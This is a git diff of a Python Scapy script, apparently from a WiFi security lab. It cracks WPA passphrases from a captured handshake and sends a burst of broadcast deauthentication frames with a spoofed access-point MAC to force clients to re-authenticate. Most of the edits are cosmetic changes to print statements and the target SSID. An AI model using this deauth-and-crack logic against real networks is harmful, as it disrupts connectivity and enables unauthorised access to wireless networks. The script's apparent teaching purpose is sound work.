@@ -39,7 +39,7 @@ wpa=rdpcap("wpa_handshake.cap")
 # Important parameters for key derivation - most of them can be obtained from the pcap file
 A           = "Pairwise key expansion" #this string is used in the pseudo-random function
 
-ssid        = "SSwisscom"
+ssid        = "APTest"
 APmac       = ""
 Clientmac   = ""
 
@@ -66,12 +66,12 @@ def crack():
     global ssid, APmac, Clientmac, ANonce, SNonce, mic_to_test, data, sniff, A
     print ("\n\nValues used to derivate keys")
     print ("============================")
-    print ("SSID: ",ssid,"\n")
-    print ("AP Mac: ",APmac.encode(),"\n")
-    print ("Cient Mac: ",Clientmac.encode(),"\n")
-    print ("AP Nonce: ",ANonce,"\n")
-    print ("Client Nonce: ",SNonce,"\n")
-    print ("Mic: ",mic_to_test,"\n")
+    print ("SSID: ",ssid)
+    print ("AP Mac: ",APmac.encode())
+    print ("Cient Mac: ",Clientmac.encode())
+    print ("AP Nonce: ",ANonce)
+    print ("Client Nonce: ",SNonce)
+    print ("Mic: ",mic_to_test)
 
     B = min(a2b_hex(APmac),a2b_hex(Clientmac))+max(a2b_hex(APmac),a2b_hex(Clientmac))+min(a2b_hex(ANonce),a2b_hex(SNonce))+max(a2b_hex(ANonce),a2b_hex(SNonce))
     
@@ -97,15 +97,15 @@ def crack():
 
             print ("\nResults of the key expansion")
             print ("=============================")
-            print ("Passphrase: ",passPhrase,"\n")
-            print ("PMK:\t\t",pmk.hex(),"\n")
-            print ("PTK:\t\t",ptk.hex(),"\n")
-            print ("KCK:\t\t",ptk[0:16].hex(),"\n")
-            print ("KEK:\t\t",ptk[16:32].hex(),"\n")
-            print ("TK:\t\t",ptk[32:48].hex(),"\n")
-            print ("MICK:\t\t",ptk[48:64].hex(),"\n")
-            print ("MIC:\t\t",mic.digest()[:-4],"\n")
-            print ("ORIG MIC:\t",mic_to_test,"\n")
+            print ("Passphrase: ",passPhrase)
+            print ("PMK:\t\t",pmk.hex())
+            print ("PTK:\t\t",ptk.hex())
+            print ("KCK:\t\t",ptk[0:16].hex())
+            print ("KEK:\t\t",ptk[16:32].hex())
+            print ("TK:\t\t",ptk[32:48].hex())
+            print ("MICK:\t\t",ptk[48:64].hex())
+            print ("MIC:\t\t",mic.digest()[:-4])
+            print ("ORIG MIC:\t",mic_to_test)
 
             # Check if the calculated mic is the same as the mic
             if mic_to_test == mic.digest()[:-4]:
@@ -129,16 +129,17 @@ def process(pkt):
     # Check if we have a 802.11 packet and haven't found the WiFi mac yet
     if pkt.haslayer(Dot11Beacon) and APmac == "":
         try:
-
+            beacon = pkt.info.decode('ascii')
+            print("New beacon from", beacon)
             # Check if the packet contains the right ssid 
-            if pkt.info.decode('ascii') == ssid:
+            if beacon == ssid:
 
                 #Register the mac of the ap
                 APmac = pkt[Dot11].addr2.replace(":", "")
                 print("Found SSID MAC", APmac)
                 
                 # Sends deauth packets once we have the mac
-                print("Deauth")
+                print("Sending Deauth packets")
                 deauth = RadioTap() / Dot11(type=0, subtype=12, addr1="FF:FF:FF:FF:FF:FF", addr2="A0:B5:49:0E:55:F9", addr3="A0:B5:49:0E:55:F9") / Dot11Deauth(reason=7)
                 sendp(deauth, inter=0.1, count=50, iface="wlan0mon")
                 
